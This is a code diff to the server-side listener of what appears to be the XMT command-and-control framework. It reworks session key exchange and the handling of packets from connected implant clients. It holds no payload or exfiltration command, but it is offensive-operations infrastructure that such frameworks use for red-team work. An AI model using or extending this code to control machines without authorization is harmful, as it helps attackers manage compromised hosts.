@@ -1,4 +1,5 @@
 //go:build !implant
+// +build !implant
 
 // Copyright (C) 2020 - 2023 iDigitalFlame
 //
@@ -20,7 +21,6 @@ package c2
 
 import (
 	"context"
-	"errors"
 	"io"
 	"net"
 	"time"
@@ -28,6 +28,7 @@ import (
 	"github.com/iDigitalFlame/xmt/c2/cfg"
 	"github.com/iDigitalFlame/xmt/c2/cout"
 	"github.com/iDigitalFlame/xmt/com"
+	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
@@ -82,7 +83,7 @@ func (l *Listener) listen() {
 			if l.state.Closing() {
 				break
 			}
-			if errors.Is(err, net.ErrClosed) {
+			if isClosedError(err) {
 				// NOTE(dij): Catch the socket being replaced, this should
 				//            only happen when replacement occurs, if we ARE
 				//            closing or the ctx was canceled, continue and
@@ -188,6 +189,9 @@ func (l *Listener) clientClear(i uint32) {
 func (l *Listener) Done() <-chan struct{} {
 	return l.ch
 }
+func (l *Listener) keyValue() data.KeyPair {
+	return l.s.Keys
+}
 func (l *Listener) transform() cfg.Transform {
 	return l.t
 }
@@ -221,7 +225,7 @@ func (l *Listener) notify(h connHost, n *com.Packet) error {
 	}
 	// KeyCrypt: Process new Packet here instead.
 	//           Fire if key is set in here for exchange.
-	s.sessionKeyUpdate(l.name, n, false)
+	s.keyCryptAndUpdate(l.name, n, false)
 	return receive(s, l, n)
 }
 
@@ -262,9 +266,9 @@ func (l *Listener) Replace(addr string, p cfg.Profile) error {
 	}
 	return nil
 }
-func (l *Listener) talk(a string, n *com.Packet) (*conn, error) {
+func (l *Listener) talk(a string, n *com.Packet) (*conn, bool, error) {
 	if n.Device.Empty() || l.state.Closing() {
-		return nil, io.ErrClosedPipe
+		return nil, false, io.ErrClosedPipe
 	}
 	if cout.Enabled {
 		l.log.Trace(`[%s:%s] %s: Received a Packet "%s"..`, l.name, n.Device, a, n)
@@ -279,7 +283,7 @@ func (l *Listener) talk(a string, n *com.Packet) (*conn, error) {
 			if cout.Enabled {
 				l.log.Error("[%s:%s] %s: Received an empty hello Packet!", l.name, n.Device, a)
 			}
-			return nil, ErrMalformedPacket
+			return nil, false, ErrMalformedPacket
 		}
 		if n.ID != SvHello {
 			if cout.Enabled {
@@ -291,7 +295,7 @@ func (l *Listener) talk(a string, n *com.Packet) (*conn, error) {
 				f.SetLen(n.Flags.Len())
 				f.SetGroup(n.Flags.Group())
 			}
-			return &conn{next: &com.Packet{ID: SvRegister, Flags: f, Device: n.Device}}, nil
+			return &conn{next: &com.Packet{ID: SvRegister, Flags: f, Device: n.Device}}, false, nil
 		}
 		s = &Session{
 			ch:         make(chan struct{}),
@@ -312,11 +316,11 @@ func (l *Listener) talk(a string, n *com.Packet) (*conn, error) {
 			if cout.Enabled {
 				l.log.Error("[%s:%s] %s: Error reading data from client: %s!", l.name, s.ID, a, err.Error())
 			}
-			return nil, err
+			return nil, false, err
 		}
 		// KeyCrypt: If client has indicated that they have a Key, generate
 		//           the set from the key data passed.
-		if s.sessionKeyInit(l.name, n); cout.Enabled {
+		if s.keyListenerInit(l.s.Keys.Private, l.name, n); cout.Enabled {
 			l.log.Debug("[%s:%s] %s: Received client device info: (OS: %s, %s).", l.name, s.ID, a, s.Device.OS(), s.Device.Version)
 		}
 		l.s.lock.Lock()
@@ -330,7 +334,7 @@ func (l *Listener) talk(a string, n *com.Packet) (*conn, error) {
 	}
 	if s.Last = time.Now(); !ok {
 		if n.Flags&com.FlagProxy == 0 {
-			s.write(true, &com.Packet{ID: SvComplete, Device: n.Device, Job: n.Job})
+			s.write(true, keyHostSync(l, n))
 		}
 		if l.s.New != nil {
 			l.m.queue(event{s: s, sf: l.s.New})
@@ -338,26 +342,26 @@ func (l *Listener) talk(a string, n *com.Packet) (*conn, error) {
 	}
 	c, err := l.resolve(s, a, n.Tags)
 	if err != nil {
-		return nil, err
+		return nil, false, err
 	}
 	// KeyCrypt: Decrypt Incoming Packet (only if non-new)
 	if ok {
-		s.sessionKeyUpdate(l.name, n, true)
+		s.keyCryptAndUpdate(l.name, n, true)
 	}
 	if err = c.process(l.log, l, a, n, false); err != nil {
-		return nil, err
+		return nil, false, err
 	}
-	return c, nil
+	return c, ok, nil
 }
 func (l *Listener) resolve(s *Session, a string, t []uint32) (*conn, error) {
 	if len(t) == 0 {
-		return &conn{host: s, key: &s.key}, nil
+		return &conn{host: s, keys: s.keys}, nil
 	}
 	c := &conn{
 		add:  make([]*com.Packet, 0, len(t)),
 		subs: make(map[uint32]bool, len(t)),
 		host: s,
-		key:  &s.key, // KeyCrypt
+		keys: s.keys,
 	}
 	return c, c.resolve(l.log, s, l, a, t, false)
 }
@@ -409,7 +413,7 @@ func (l *Listener) talkSub(a string, n *com.Packet, o bool) (connHost, uint32, *
 		}
 		// KeyCrypt: If client has indicated that they have a Key, generate
 		//           the set from the key data passed.
-		if s.sessionKeyInit(l.name, n); cout.Enabled {
+		if s.keyListenerInit(l.s.Keys.Private, l.name, n); cout.Enabled {
 			l.log.Debug("[%s:%s/M] %s: Received client device info: (OS: %s, %s).", l.name, s.ID, a, s.Device.OS(), s.Device.Version)
 		}
 		l.s.lock.Lock()
@@ -421,7 +425,7 @@ func (l *Listener) talkSub(a string, n *com.Packet, o bool) (connHost, uint32, *
 	s.host.Set(a)
 	if s.Last = time.Now(); !ok {
 		if n.Flags&com.FlagProxy == 0 {
-			s.write(true, &com.Packet{ID: SvComplete, Device: n.Device, Job: n.Job})
+			s.write(true, keyHostSync(l, n))
 		}
 		if l.s.New != nil {
 			l.m.queue(event{s: s, sf: l.s.New})
@@ -429,7 +433,7 @@ func (l *Listener) talkSub(a string, n *com.Packet, o bool) (connHost, uint32, *
 	}
 	// KeyCrypt: Decrypt Incoming Packet (only if non-new)
 	if ok {
-		s.sessionKeyUpdate(l.name, n, true)
+		s.keyCryptAndUpdate(l.name, n, true)
 	}
 	if err := receive(s, l, n); err != nil {
 		if cout.Enabled {
@@ -443,8 +447,8 @@ func (l *Listener) talkSub(a string, n *com.Packet, o bool) (connHost, uint32, *
 	z := s.next(true)
 	if z != nil {
 		// KeyCrypt: Encrypt this new Packet and check for key changes.
-		z.Crypt(&s.key)
-		s.keyCheck()
+		z.KeyCrypt(s.keys)
+		s.keyCheckSync()
 	}
 	return s, i, z, nil
 }
